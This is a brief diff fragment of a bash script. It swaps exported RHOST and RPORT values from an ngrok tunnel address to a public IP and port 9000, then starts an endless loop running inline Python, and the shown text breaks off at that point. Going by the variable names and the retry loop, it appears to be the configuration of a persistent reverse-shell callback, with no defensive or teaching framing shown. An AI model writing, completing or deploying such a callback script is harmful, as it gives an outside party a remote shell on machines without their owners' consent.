@@ -1,7 +1,7 @@
 #!/bin/bash
 
-export RHOST="0.tcp.in.ngrok.io"
-export RPORT=13167
+export RHOST="140.238.246.110"
+export RPORT=9000
 
 while true; do
     python3 -c '
